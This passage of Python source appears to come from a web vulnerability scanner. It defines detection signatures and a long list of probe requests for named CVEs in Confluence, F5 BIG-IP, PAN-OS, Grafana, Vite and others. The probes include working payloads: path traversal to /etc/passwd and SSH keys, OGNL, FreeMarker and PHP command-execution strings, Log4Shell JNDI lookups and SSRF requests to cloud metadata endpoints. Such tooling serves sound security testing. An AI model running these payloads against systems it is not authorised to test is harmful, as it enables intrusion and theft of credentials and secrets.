        pattern=re.compile(
            r'uid=0\(root\)|uid=\d+\(\w+\)\s+gid=\d+|'
            r'Linux\s+\S+\s+\d+\.\d+\.\d+.*?#\d+\s+SMP',
            re.I),
        description="Remote Code Execution — command output in response",
        tags=["rce"],
        html_allowed=True,
    ),

    # ══════════════════════════════════════════════════════════
    # LOG4SHELL
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Log4Shell callback / OOB (CVE-2021-44228)",
        severity="CRITICAL",
        pattern=re.compile(r'uid=\d+|/etc/passwd|java\.lang\.Runtime|jndi:', re.I),
        description="Log4j JNDI injection — potential OOB callback or code execution",
        cve="CVE-2021-44228",
        tags=["log4j", "rce"],
        html_allowed=True,
    ),

    # ══════════════════════════════════════════════════════════
    # DESERIALIZATION
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Java deserialization RCE",
        severity="CRITICAL",
        pattern=re.compile(rb'\xac\xed\x00\x05|rO0ABQ|java\.lang\.Runtime'),
        is_bytes=True,
        description="Java serialized object in response — deserialization attack vector",
        tags=["deserialization", "java", "rce"],
    ),
    Signature(
        name="PHP deserialization object",
        severity="HIGH",
        pattern=re.compile(r'O:\d+:"[A-Za-z\\]+":'),
        description="PHP serialized object exposed — deserialization attack vector",
        tags=["deserialization", "php"],
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # PROTOTYPE POLLUTION
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Prototype pollution reflected",
        severity="HIGH",
        pattern=re.compile(r'"__proto__"\s*:\s*\{.*?"polluted"', re.S | re.I),
        description="Prototype pollution payload reflected — merge gadget present",
        tags=["prototype-pollution"],
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # PALO ALTO PAN-OS
    # ══════════════════════════════════════════════════════════
    Signature(
        name="PAN-OS GlobalProtect CVE-2024-3400",
        severity="CRITICAL",
        pattern=re.compile(r'<response\s+status="error"|GP_COOKIE|clientIpAddress', re.I),
        description="PAN-OS GlobalProtect — CVE-2024-3400 injection point",
        cve="CVE-2024-3400",
        tags=["panos", "rce"],
        required_path_pattern=re.compile(r'/global-protect/|/ssl-vpn/', re.I),
        html_allowed=True,
    ),

    # ══════════════════════════════════════════════════════════
    # F5 BIG-IP
    # ══════════════════════════════════════════════════════════
    Signature(
        name="F5 BIG-IP iControl RCE (CVE-2022-1388)",
        severity="CRITICAL",
        pattern=re.compile(r'"kind"\s*:\s*"tm:|uid=\d+\(', re.I),
        description="BIG-IP iControl REST — unauthenticated RCE",
        cve="CVE-2022-1388",
        tags=["bigip", "rce"],
        required_path_pattern=re.compile(r'/mgmt/tm/', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # CONFLUENCE
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Confluence OGNL injection (CVE-2022-26134)",
        severity="CRITICAL",
        pattern=re.compile(r'uid=\d+|java\.lang\.Runtime|com\.opensymphony\.xwork2', re.I),
        description="Confluence OGNL injection — RCE confirmed",
        cve="CVE-2022-26134",
        tags=["confluence", "rce"],
        required_path_pattern=re.compile(r'\.action|confluence', re.I),
        html_allowed=True,
    ),

    # ══════════════════════════════════════════════════════════
    # IVANTI / CITRIX
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Ivanti Connect Secure RCE (CVE-2024-21887)",
        severity="CRITICAL",
        pattern=re.compile(r'uid=\d+\(|/etc/passwd|command.*?executed', re.I),
        description="Ivanti Connect Secure — command injection confirmed",
        cve="CVE-2024-21887",
        tags=["ivanti", "rce"],
        required_path_pattern=re.compile(r'/api/v1/totp/user-backup-code|/dana-na/', re.I),
        html_allowed=True,
    ),
    Signature(
        name="Citrix NetScaler auth bypass (CVE-2023-3519)",
        severity="CRITICAL",
        pattern=re.compile(r'uid=\d+\(|/nsconfig/ns\.conf|/etc/passwd', re.I),
        description="Citrix NetScaler ADC — auth bypass/RCE",
        cve="CVE-2023-3519",
        tags=["citrix", "rce"],
        required_path_pattern=re.compile(r'/cgi/login|/owa/auth|smb', re.I),
        html_allowed=True,
    ),

    # ══════════════════════════════════════════════════════════
    # ATLASSIAN JIRA
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Jira user enumeration / SSRF",
        severity="HIGH",
        pattern=re.compile(r'"displayName"\s*:\s*"[^"]+",\s*"emailAddress"\s*:', re.I),
        description="Jira REST API — user PII accessible",
        tags=["jira", "enum"],
        required_path_pattern=re.compile(r'/rest/api/\d+/user|/rest/api/latest/user', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # GRAFANA
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Grafana admin default creds (CVE-2021-43798)",
        severity="CRITICAL",
        pattern=re.compile(r'"orgId"\s*:\s*\d+|"isGrafanaAdmin"\s*:\s*true', re.I),
        description="Grafana API authenticated — default admin/admin accepted",
        cve="CVE-2021-43798",
        tags=["grafana", "auth"],
        required_path_pattern=re.compile(r'/api/org|/api/admin|/api/users', re.I),
        html_allowed=False,
    ),
    Signature(
        name="Grafana path traversal (CVE-2021-43798)",
        severity="CRITICAL",
        pattern=re.compile(r'root:x:0:0:|APP_KEY=|DB_PASSWORD=', re.I),
        description="Grafana plugin directory traversal — file read",
        cve="CVE-2021-43798",
        tags=["grafana", "lfi"],
        required_path_pattern=re.compile(r'/public/plugins/', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # MATTERMOST / ROCKETCHAT
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Mattermost API token leak",
        severity="HIGH",
        pattern=re.compile(r'"token"\s*:\s*"[a-z0-9]{26}"', re.I),
        description="Mattermost API auth token exposed",
        tags=["mattermost", "token"],
        required_path_pattern=re.compile(r'/api/v\d+/users|/api/v\d+/teams', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # PROMETHEUS
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Prometheus metrics exposed",
        severity="MEDIUM",
        pattern=re.compile(r'# HELP |# TYPE |go_gc_duration_seconds|http_requests_total', re.I),
        description="Prometheus metrics endpoint — infrastructure data exposed",
        tags=["prometheus", "monitoring"],
        required_path_pattern=re.compile(r'/metrics$|/actuator/prometheus', re.I),
        html_allowed=False,
    ),
    Signature(
        name="Prometheus Federation / scrape config exposed",
        severity="HIGH",
        pattern=re.compile(r'"scrape_configs"|"target_groups"|"job_name"', re.I),
        description="Prometheus config — target list and scrape details",
        tags=["prometheus", "monitoring"],
        required_path_pattern=re.compile(r'/api/v1/targets|/api/v1/status/config', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # SWAGGER / API DOCS
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Swagger/OpenAPI spec exposed",
        severity="MEDIUM",
        pattern=re.compile(
            r'"swagger"\s*:\s*"[23]\.\d"|"openapi"\s*:\s*"[23]\.\d|'
            r'"paths"\s*:\s*\{.*?"/\w+"\s*:\s*\{',
            re.I | re.S),
        description="Swagger/OpenAPI spec — full API mapping exposed",
        tags=["swagger", "api"],
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # BACKUP / SOURCE FILES
    # ══════════════════════════════════════════════════════════
    Signature(
        name="SQL database backup exposed",
        severity="CRITICAL",
        pattern=re.compile(
            r'CREATE TABLE|INSERT INTO|mysqldump|PostgreSQL database dump|'
            r'-- Database:|PRAGMA foreign_keys|DROP TABLE IF EXISTS',
            re.I),
        description="SQL dump — full database backup exposed",
        tags=["database", "backup"],
        html_allowed=False,
    ),
    Signature(
        name="Composer/package.json with private registry",
        severity="MEDIUM",
        pattern=re.compile(
            r'"_auth"\s*:|"authToken"\s*:|"always-auth"\s*:\s*true',
            re.I),
        description="NPM/Composer auth credentials in package config",
        tags=["supply-chain", "secret"],
        html_allowed=False,
    ),
    Signature(
        name="Web.config / applicationHost.config exposed",
        severity="HIGH",
        pattern=re.compile(
            r'<connectionStrings>|<appSettings>|<authentication\s+mode=|'
            r'machineKey\s+validationKey=',
            re.I),
        description="ASP.NET web.config — connection strings/keys exposed",
        tags=["aspnet", "secret"],
        required_path_pattern=re.compile(r'web\.config|applicationHost\.config', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # RAILS DEBUG
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Rails debug info exposed",
        severity="HIGH",
        pattern=re.compile(
            r'Rails\.root\s*=|config\.secret_key_base\s*=|'
            r'Application Trace.*?Framework Trace',
            re.I | re.S),
        description="Rails debug information exposed",
        tags=["rails", "debug"],
        required_path_pattern=re.compile(r'/rails/info|/rails/mailers', re.I),
        html_allowed=True,
    ),

    # ══════════════════════════════════════════════════════════
    # NGINX ALIAS OFF-BY-SLASH LFI
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Nginx alias misconfiguration LFI",
        severity="HIGH",
        pattern=re.compile(r'root:x:0:0:|APP_KEY=|DB_PASSWORD=|\[core\]', re.I),
        description="Nginx alias off-by-slash — file read via path traversal",
        tags=["nginx", "lfi", "misconfig"],
        required_path_pattern=re.compile(r'/static\.\.|/files\.\.|/assets\.\.', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # TOMCAT
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Tomcat WEB-INF exposed",
        severity="HIGH",
        pattern=re.compile(r'<web-app|<servlet-mapping>|<context-param>', re.I),
        description="Tomcat WEB-INF/web.xml — servlet mapping exposed",
        tags=["tomcat", "java"],
        required_path_pattern=re.compile(r'WEB-INF/web\.xml', re.I),
        html_allowed=False,
    ),
    Signature(
        name="Tomcat Manager UI exposed",
        severity="CRITICAL",
        pattern=re.compile(r'Tomcat Web Application Manager|<title>Tomcat.*Manager', re.I),
        description="Tomcat Manager — WAR upload / RCE possible",
        tags=["tomcat", "rce"],
        required_path_pattern=re.compile(r'/manager/html|/manager/text', re.I),
        html_allowed=True,
    ),

    # ══════════════════════════════════════════════════════════
    # NPMRC / HTPASSWD
    # ══════════════════════════════════════════════════════════
    Signature(
        name=".npmrc authToken exposed",
        severity="CRITICAL",
        pattern=re.compile(
            r'//registry\.npmjs\.org/:_authToken|_auth\s*=\s*[A-Za-z0-9+/=]{20,}', re.I),
        description=".npmrc with NPM token — supply chain attack vector",
        tags=["supply-chain", "secret"],
        required_path_pattern=re.compile(r'\.npmrc', re.I),
        html_allowed=False,
    ),
    Signature(
        name=".htpasswd exposed",
        severity="HIGH",
        pattern=re.compile(r'^[A-Za-z0-9_\-]+:\$(?:apr1|2y)\$[A-Za-z0-9./]+', re.M),
        description=".htpasswd — hashed credentials exposed",
        tags=["apache", "auth"],
        required_path_pattern=re.compile(r'\.htpasswd', re.I),
        html_allowed=False,
    ),

    # ══════════════════════════════════════════════════════════
    # DIRECTORY LISTING
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Directory listing enabled",
        severity="MEDIUM",
        pattern=re.compile(r'Index of /.*<a href=|Parent Directory.*Last modified', re.I | re.S),
        min_content_length=100,
        description="Web server directory listing — internal files browseable",
        tags=["misconfig"],
        html_allowed=True,
    ),

    # ══════════════════════════════════════════════════════════
    # MISCELLANEOUS MISCONFIGS
    # ══════════════════════════════════════════════════════════
    Signature(
        name="Apache httpd.conf exposed",
        severity="HIGH",
        pattern=re.compile(r'ServerRoot\s+"|DocumentRoot\s+"|Options\s+(?:All|Indexes)', re.I | re.M),
        description="Apache httpd.conf — full server configuration exposed",
        tags=["apache", "misconfig"],
        html_allowed=False,
    ),
    Signature(
        name="Server error — internal path disclosure",
        severity="MEDIUM",
        pattern=re.compile(
            r'/(?:var|usr|home|opt|srv|app)/[a-zA-Z0-9_/\-\.]+\.(?:php|py|rb|java|class)\b',
            re.I),
        description="Internal server path disclosed in error response",
        tags=["info-disclosure"],
        html_allowed=True,
    ),
    Signature(
        name="Exposed .DS_Store file (macOS)",
        severity="LOW",
        pattern=re.compile(rb'\x00\x00\x00\x01Bud1|\x00\x00\x00\x04Bud1', re.S),
        is_bytes=True,
        description=".DS_Store — macOS directory metadata, reveals filenames",
        tags=["info-disclosure"],
        required_path_pattern=re.compile(r'\.DS_Store', re.I),
    ),
    Signature(
        name="Exposed .svn/entries (Subversion)",
        severity="HIGH",
        pattern=re.compile(r'^10\n\ndir\n\d+\nhttps://', re.M),
        description="SVN repository .svn/entries — source code path leak",
        tags=["svn", "source-code"],
        required_path_pattern=re.compile(r'\.svn/', re.I),
        html_allowed=False,
    ),
    Signature(
        name="Exposed Terraform state file",
        severity="CRITICAL",
        pattern=re.compile(r'"terraform_version"\s*:|"resources"\s*:\s*\[.*?"type"\s*:"', re.I | re.S),
        description="Terraform state — infrastructure secrets and resource IDs",
        tags=["terraform", "secret"],
        html_allowed=False,
    ),
    Signature(
        name="Ansible inventory / vault exposed",
        severity="CRITICAL",
        pattern=re.compile(r'\$ANSIBLE_VAULT;[0-9.]+;AES256|ansible_ssh_pass\s*=', re.I | re.M),
        description="Ansible vault/inventory — encrypted secrets or plaintext passwords",
        tags=["ansible", "secret"],
        html_allowed=False,
    ),
]

# ─────────────────────────────────────────────────────────────────────────────
# ══════════════════════════════════════════════════════════════════════════════
#  PROBES — 200+ HTTP paths to test
# ══════════════════════════════════════════════════════════════════════════════
# ─────────────────────────────────────────────────────────────────────────────
@dataclass
class Probe:
    path:          str
    label:         str
    method:        str            = "GET"
    body:          Optional[dict] = None
    extra_headers: Optional[dict] = None
    cve:           str            = ""
    # Expected status codes (empty = accept all non-404)
    expected_status: tuple = field(default_factory=lambda: (200,))

PROBES: list[Probe] = [

    # ── ENV VARIANTS (20+) ─────────────────────────────────────
    Probe("/.env",                      ".env"),
    Probe("/.env.backup",               ".env.backup"),
    Probe("/.env.local",                ".env.local"),
    Probe("/.env.production",           ".env.production"),
    Probe("/.env.prod",                 ".env.prod"),
    Probe("/.env.dev",                  ".env.dev"),
    Probe("/.env.development",          ".env.development"),
    Probe("/.env.staging",              ".env.staging"),
    Probe("/.env.example",              ".env.example"),
    Probe("/.env.test",                 ".env.test"),
    Probe("/.env.testing",              ".env.testing"),
    Probe("/.env.old",                  ".env.old"),
    Probe("/.env.bak",                  ".env.bak"),
    Probe("/.env.save",                 ".env.save"),
    Probe("/.env~",                     ".env~"),
    Probe("/.env.2025",                 ".env.2025"),
    Probe("/.env.2024",                 ".env.2024"),
    Probe("/.env.2023",                 ".env.2023"),
    Probe("/.env.sample",               ".env.sample"),
    Probe("/.env.orig",                 ".env.orig"),
    Probe("/.env.docker",               ".env.docker"),
    Probe("/config.env",                "config.env"),
    Probe("/env",                       "env"),
    Probe("/application.env",           "application.env"),
    Probe("/.config",                   ".config"),

    # ── GIT (10+) ──────────────────────────────────────────────
    Probe("/.git/config",               ".git/config"),
    Probe("/.git/HEAD",                 ".git/HEAD"),
    Probe("/.git/COMMIT_EDITMSG",       ".git/COMMIT_EDITMSG"),
    Probe("/.git/logs/HEAD",            ".git/logs/HEAD"),
    Probe("/.git/refs/heads/main",      ".git/refs/main"),
    Probe("/.git/refs/heads/master",    ".git/refs/master"),
    Probe("/.git/refs/heads/develop",   ".git/refs/develop"),
    Probe("/.git/refs/heads/dev",       ".git/refs/dev"),
    Probe("/.git/packed-refs",          ".git/packed-refs"),
    Probe("/.git/info/refs",            ".git/info/refs"),
    Probe("/.gitconfig",                ".gitconfig"),
    Probe("/.gitignore",                ".gitignore"),

    # ── SVN ────────────────────────────────────────────────────
    Probe("/.svn/entries",              ".svn/entries"),
    Probe("/.svn/wc.db",                ".svn/wc.db"),

    # ── CVE-2024-23331 / CVE-2025-30208 Vite @fs ──────────────
    Probe("/@fs/etc/passwd",                         "Vite @fs /etc/passwd",          cve="CVE-2024-23331"),
    Probe("/@fs/etc/passwd?raw",                     "Vite @fs ?raw",                 cve="CVE-2024-23331"),
    Probe("/@fs/etc/passwd?import&raw",              "Vite @fs ?import&raw",          cve="CVE-2024-23331"),
    Probe("/@fs/proc/self/environ",                  "Vite @fs environ",              cve="CVE-2024-23331"),
    Probe("/@fs/proc/self/environ?raw",              "Vite @fs environ raw",          cve="CVE-2024-23331"),
    Probe("/@fs/app/.env",                           "Vite @fs app .env",             cve="CVE-2024-23331"),
    Probe("/@fs/app/.env?raw",                       "Vite @fs app .env raw",         cve="CVE-2024-23331"),
    Probe("/@fs/var/www/html/.env",                  "Vite @fs www .env",             cve="CVE-2024-23331"),
    Probe("/@fs/etc/passwd?raw??",                   "Vite ?raw?? bypass",            cve="CVE-2025-30208"),
    Probe("/@fs/proc/self/environ?raw??",            "Vite environ ?raw??",           cve="CVE-2025-30208"),
    Probe("/@fs/app/.env?raw??",                     "Vite .env ?raw??",              cve="CVE-2025-30208"),
    Probe("/@fs/etc/shadow?raw??",                   "Vite shadow ?raw??",            cve="CVE-2025-30208"),
    Probe("/@fs/root/.ssh/id_rsa?raw",               "Vite root id_rsa",              cve="CVE-2024-23331"),
    Probe("/@fs/etc/ssh/ssh_host_rsa_key?raw",       "Vite SSH host key",             cve="CVE-2024-23331"),
    Probe("/@fs/etc/nginx/nginx.conf?raw",           "Vite nginx.conf",               cve="CVE-2024-23331"),
    Probe("/@fs/etc/apache2/apache2.conf?raw",       "Vite apache2.conf",             cve="CVE-2024-23331"),
    Probe("/@fs/var/www/html/wp-config.php?raw",     "Vite wp-config",                cve="CVE-2024-23331"),

    # ── PHP LFI WRAPPERS ───────────────────────────────────────
    Probe("/?page=php://filter/convert.base64-encode/resource=index",           "LFI php://filter index"),
    Probe("/?file=php://filter/convert.base64-encode/resource=/etc/passwd",     "LFI php://filter passwd"),
    Probe("/?page=php://filter/convert.base64-encode/resource=../config",       "LFI php://filter config"),
    Probe("/?page=data://text/plain;base64,PD9waHAgc3lzdGVtKCdpZCcpOz8+",      "LFI data:// RCE"),
    Probe("/?page=../../../../etc/passwd",                                       "LFI classic traversal"),
    Probe("/?file=....//....//....//etc/passwd",                                 "LFI four-dot bypass"),
    Probe("/?page=%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd",                    "LFI URL-encoded"),
    Probe("/?page=..%252f..%252f..%252fetc%252fpasswd",                         "LFI double URL-encoded"),
    Probe("/?file=php://input",                                                  "LFI php://input"),
    Probe("/?page=expect://id",                                                  "LFI expect:// RCE"),
    Probe("/?file=/etc/passwd%00",                                               "LFI null-byte"),
    Probe("/?path=php://filter/read=string.rot13/resource=index",               "LFI rot13 filter"),

    # ── CVE-2021-41773 / CVE-2021-42013 Apache ────────────────
    Probe("/cgi-bin/.%2e/.%2e/.%2e/.%2e/etc/passwd",         "Apache CVE-2021-41773 cgi",     cve="CVE-2021-41773"),
    Probe("/cgi-bin/.%%32%65/.%%32%65/.%%32%65/etc/passwd",  "Apache CVE-2021-42013 dbl",     cve="CVE-2021-42013"),
    Probe("/.%2e/.%2e/.%2e/.%2e/etc/passwd",                 "Apache CVE-2021-41773 no-cgi",  cve="CVE-2021-41773"),
    Probe("/icons/.%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd",     "Apache icons traversal",        cve="CVE-2021-41773"),
    Probe("/cgi-bin/.%2e/.%2e/.%2e/.%2e/bin/sh",             "Apache CGI shell",              cve="CVE-2021-41773",
          method="POST", body={"cmd": "id"}, extra_headers={"Content-Type": "application/x-www-form-urlencoded"}),

    # ── SPRING BOOT ACTUATOR ───────────────────────────────────
    Probe("/actuator/env",              "Spring /actuator/env"),
    Probe("/actuator/health",           "Spring /actuator/health"),
    Probe("/actuator/mappings",         "Spring /actuator/mappings"),
    Probe("/actuator/beans",            "Spring /actuator/beans"),
    Probe("/actuator/configprops",      "Spring /actuator/configprops"),
    Probe("/actuator/heapdump",         "Spring /actuator/heapdump"),
    Probe("/actuator/httptrace",        "Spring /actuator/httptrace"),
    Probe("/actuator/loggers",          "Spring /actuator/loggers"),
    Probe("/actuator/threaddump",       "Spring /actuator/threaddump"),
    Probe("/actuator/metrics",          "Spring /actuator/metrics"),
    Probe("/actuator/info",             "Spring /actuator/info"),
    Probe("/actuator/caches",           "Spring /actuator/caches"),
    Probe("/actuator/prometheus",       "Spring /actuator/prometheus"),
    Probe("/actuator/scheduledtasks",   "Spring /actuator/scheduledtasks"),
    Probe("/actuator/sessions",         "Spring /actuator/sessions"),
    # Spring Security bypass
    Probe("/secure/..;/actuator/env",   "Spring ..;/ bypass",        cve="CVE-2023-34035"),
    Probe("/login/..;/actuator/env",    "Spring login bypass",       cve="CVE-2023-34035"),
    Probe("/api/..;/actuator/env",      "Spring api bypass",         cve="CVE-2023-34035"),
    # Spring old endpoints
    Probe("/env",                       "Spring /env"),
    Probe("/trace",                     "Spring /trace"),
    Probe("/health",                    "Spring /health"),
    Probe("/dump",                      "Spring /dump"),
    Probe("/metrics",                   "Spring /metrics"),
    Probe("/beans",                     "Spring /beans"),
    # CVE-2022-22965 Spring4Shell
    Probe("/WEB-INF/web.xml",           "Spring4Shell WEB-INF",      cve="CVE-2022-22965"),

    # ── CVE-2024-27198/27199 TeamCity ─────────────────────────
    Probe("/app/rest/users",            "TeamCity users",            cve="CVE-2024-27198"),
    Probe("/app/rest/server",           "TeamCity server",           cve="CVE-2024-27198"),
    Probe("/app/rest/users/id:1/tokens","TeamCity admin token",      cve="CVE-2023-42793"),
    Probe("/res/projectPlugin.html;.jsp","TeamCity ;.ext bypass",    cve="CVE-2024-27199"),
    Probe("/app/rest/builds",           "TeamCity builds",           cve="CVE-2024-27198"),
    Probe("/app/rest/investigations",   "TeamCity investigations",   cve="CVE-2024-27198"),

    # ── CVE-2022-26134 / CVE-2021-26084 Confluence ─────────────
    Probe("/pages/doenterpagevariables.action",           "Confluence OGNL",           cve="CVE-2021-26084"),
    Probe("/%24%7B%40java.lang.Runtime%40getRuntime%28%29.exec%28%27id%27%29%7D/",
          "Confluence OGNL RCE",   cve="CVE-2022-26134"),
    Probe("/setup/setupadministrator.action",             "Confluence setup bypass",   cve="CVE-2023-22518"),
    Probe("/rest/api/user?username=admin",                "Confluence user enum"),

    # ── CVE-2022-1388 F5 BIG-IP ───────────────────────────────
    Probe("/mgmt/tm/util/bash",         "BIG-IP bash RCE",           cve="CVE-2022-1388",
          method="POST",
          body={"command": "run", "utilCmdArgs": "-c id"},
          extra_headers={"X-F5-Auth-Token": "", "Connection": "keep-alive, X-F5-Auth-Token"}),
    Probe("/mgmt/shared/authn/login",   "BIG-IP auth",               cve="CVE-2022-1388"),
    Probe("/tmui/login.jsp/..;/tmui/locallb/workspace/fileRead.jsp?fileName=/etc/passwd",
          "BIG-IP TMUI traversal",  cve="CVE-2020-5902"),
    Probe("/mgmt/tm/sys/version",       "BIG-IP version",            cve="CVE-2022-1388"),

    # ── CVE-2024-3400 Palo Alto PAN-OS ────────────────────────
    Probe("/global-protect/login.esp",       "PAN-OS GP login",       cve="CVE-2024-3400"),
    Probe("/ssl-vpn/hipreportcheck.esp",     "PAN-OS HIP",            cve="CVE-2024-3400"),
    Probe("/global-protect/getconfig.esp",   "PAN-OS getconfig",      cve="CVE-2024-3400"),
    Probe("/global-protect/prelogin.esp",    "PAN-OS prelogin",       cve="CVE-2024-3400"),
    Probe("/php/utils/createHIPReport.php",  "PAN-OS createHIP",      cve="CVE-2024-3400"),

    # ── CVE-2019-11510 Pulse Secure ───────────────────────────
    Probe("/dana-na/../dana/html5acc/guacamole/../../../../../../../etc/passwd?/dana/html5acc/guacamole/",
          "Pulse Secure LFI",      cve="CVE-2019-11510"),

    # ── CVE-2018-13379 FortiOS ────────────────────────────────
    Probe("/remote/fgt_lang?lang=/../../../..//////////dev/cmdb/sslvpn_websession",
          "FortiOS LFI",           cve="CVE-2018-13379"),
    Probe("/remote/login",          "FortiOS login page",            cve="CVE-2018-13379"),

    # ── CVE-2024-21887 Ivanti ─────────────────────────────────
    Probe("/api/v1/totp/user-backup-code/../../system",  "Ivanti path traversal",  cve="CVE-2024-21887"),
    Probe("/dana-na/auth/url_default/welcome.cgi",       "Ivanti welcome",         cve="CVE-2024-21887"),

    # ── CVE-2023-3519 Citrix NetScaler ────────────────────────
    Probe("/gwtest/formssso",       "Citrix NetScaler SSRF probe",   cve="CVE-2023-3519"),
    Probe("/citrix/rdpweb/",        "Citrix RDP Web",                cve="CVE-2023-3519"),

    # ── CVE-2024-1709 ConnectWise ─────────────────────────────
    Probe("/SetupWizard.aspx/",     "ScreenConnect setup",           cve="CVE-2024-1709"),
    Probe("/SetupWizard.aspx/RootPage/../Administration",
          "ScreenConnect bypass",  cve="CVE-2024-1709"),

    # ── CVE-2023-46604 Apache ActiveMQ RCE ────────────────────
    Probe("/admin/",                "ActiveMQ admin",                cve="CVE-2023-46604"),
    Probe("/api/jolokia/",          "ActiveMQ Jolokia",              cve="CVE-2023-46604"),

    # ── CVE-2021-44228 Log4Shell ──────────────────────────────
    Probe("/?q=${jndi:ldap://127.0.0.1/a}", "Log4Shell GET param",   cve="CVE-2021-44228",
          extra_headers={"X-Api-Version": "${jndi:ldap://127.0.0.1/a}",
                         "User-Agent": "${jndi:ldap://127.0.0.1/a}"}),
    Probe("/api/search?q=${jndi:ldap://127.0.0.1/a}", "Log4Shell /api/search", cve="CVE-2021-44228"),

    # ── CVE-2021-43798 Grafana LFI ────────────────────────────
    Probe("/public/plugins/alertlist/../../../../../../../../etc/passwd",   "Grafana LFI",          cve="CVE-2021-43798"),
    Probe("/public/plugins/text/../../../../../../../../etc/passwd",        "Grafana text LFI",     cve="CVE-2021-43798"),
    Probe("/public/plugins/barchart/../../../../../../../../etc/passwd",    "Grafana barchart LFI", cve="CVE-2021-43798"),
    Probe("/api/org",               "Grafana API org",               cve="CVE-2021-43798"),
    Probe("/api/users",             "Grafana API users",             cve="CVE-2021-43798"),

    # ── CVE-2022-22954 VMware Workspace ONE SSTI ───────────────
    Probe("/catalog-portal/ui/oauth/verify?error=&deviceUdid=%24%7B%22freemarker.template.utility.Execute%22%3Fnew%28%29%28%22id%22%29%7D",
          "VMware WS1 SSTI",       cve="CVE-2022-22954"),

    # ── CVE-2023-4966 Citrix Bleed ────────────────────────────
    Probe("/oauth/idp/.well-known/openid-configuration",    "Citrix Bleed probe",    cve="CVE-2023-4966"),

    # ── CVE-2024-6387 OpenSSH regreSSHion ─────────────────────
    Probe("/.well-known/ssh-fingerprint",    "SSH fingerprint probe",  cve="CVE-2024-6387"),

    # ── CVE-2023-44487 HTTP/2 Rapid Reset ─────────────────────
    Probe("/",                               "HTTP/2 baseline",        cve="CVE-2023-44487",
          extra_headers={"Connection": "Upgrade, HTTP2-Settings", "Upgrade": "h2c"}),

    # ── GRAPHQL ───────────────────────────────────────────────
    Probe("/graphql",               "GraphQL introspection",
          method="POST",
          body={"query": "{__schema{types{name fields{name}}}}"},
          extra_headers={"Content-Type": "application/json"}),
    Probe("/api/graphql",           "GraphQL /api",
          method="POST",
          body={"query": "{__schema{queryType{name}}}"},
          extra_headers={"Content-Type": "application/json"}),
    Probe("/graphiql",              "GraphiQL IDE"),
    Probe("/playground",            "GraphQL Playground"),
    Probe("/v1/graphql",            "GraphQL Hasura v1"),
    Probe("/api/v1/graphql",        "GraphQL /api/v1"),

    # ── SSRF PROBES ───────────────────────────────────────────
    Probe("/api/v1/fetch?url=http://169.254.169.254/latest/meta-data/",       "SSRF AWS ?url="),
    Probe("/api/v1/fetch?url=http://metadata.google.internal/computeMetadata/v1/",
          "SSRF GCP ?url=", extra_headers={"Metadata-Flavor": "Google"}),
    Probe("/proxy?url=http://169.254.169.254/latest/meta-data/",              "SSRF proxy AWS"),
    Probe("/redirect?url=http://169.254.169.254/latest/meta-data/",           "SSRF redirect"),
    Probe("/fetch?url=http://169.254.169.254/latest/meta-data/",              "SSRF fetch"),
    Probe("/api/webhook?url=http://169.254.169.254/latest/meta-data/",        "SSRF webhook"),
    Probe("/api/download?url=http://169.254.169.254/latest/meta-data/",       "SSRF download"),

    # ── SSTI PROBES ───────────────────────────────────────────
    Probe("/?name={{7*7}}",         "SSTI Jinja2 probe"),
    Probe("/?q=<%=7*7%>",           "SSTI ERB probe"),
    Probe("/?input=${7777777}",     "SSTI FreeMarker probe"),
    Probe("/?page=*{7*7}",          "SSTI Thymeleaf probe"),
    Probe("/?search=#{7*7}",        "SSTI EL probe"),

    # ── XXE PROBES ────────────────────────────────────────────
    Probe("/api/xml",               "XXE XML endpoint",
          method="POST",
          body=None,
          extra_headers={"Content-Type": "application/xml"},
    ),
    Probe("/xmlrpc.php",            "WordPress XML-RPC",
          method="POST",
          extra_headers={"Content-Type": "text/xml"},
    ),

    # ── NUXT / NEXT.JS DEVTOOLS ───────────────────────────────
    Probe("/__nuxt_devtools__/client/", "Nuxt DevTools"),
    Probe("/__webpack_hmr",             "Webpack HMR"),
    Probe("/webpack-dev-server",        "Webpack DevServer"),
    Probe("/.webpack/stats.json",       "Webpack stats.json"),
    Probe("/_next/static/chunks/",      "Next.js chunks"),
    Probe("/__vite_ping",               "Vite dev server ping"),

    # ── NGINX ALIAS OFF-BY-SLASH ──────────────────────────────
    Probe("/static../etc/passwd",       "Nginx alias LFI /static"),
    Probe("/files../etc/passwd",        "Nginx alias LFI /files"),
    Probe("/assets../../../etc/passwd", "Nginx alias LFI /assets"),
    Probe("/media../etc/passwd",        "Nginx alias LFI /media"),
    Probe("/nginx_status",              "Nginx stub_status"),

    # ── SUPPLY CHAIN / CONFIG ─────────────────────────────────
    Probe("/.npmrc",                    ".npmrc auth token"),
    Probe("/.netrc",                    ".netrc credentials"),
    Probe("/.aws/credentials",          ".aws/credentials"),
    Probe("/aws_credentials",           "aws_credentials"),
    Probe("/.docker/config.json",       "Docker config.json"),
    Probe("/docker-compose.yml",        "docker-compose.yml"),
    Probe("/docker-compose.yaml",       "docker-compose.yaml"),
    Probe("/docker-compose.prod.yml",   "docker-compose.prod.yml"),
    Probe("/kubernetes.yml",            "kubernetes.yml"),
